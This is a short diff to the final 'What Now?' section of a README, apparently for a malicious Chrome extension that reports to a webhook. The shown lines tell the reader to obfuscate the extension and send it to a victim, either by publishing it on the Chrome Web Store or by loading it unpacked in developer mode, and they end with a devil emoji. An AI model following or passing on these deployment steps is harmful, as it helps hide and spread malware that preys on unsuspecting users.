@@ -40,8 +40,9 @@ into the box which asks for your webhook.
 ### 5. What Now?
 
 ```
+(paid) 
 Obfustacte It Send It To A Vicim, You can learn how to publish an extension here: https://developer.chrome.com/docs/webstore/publish/.
-
+(Free)
 or Go to chrome://extensions/ turn on dev mode and click load unpack chose the file for the extension
 
 Lastly Edit the manifest.json file if you want to personalize the extension.😈
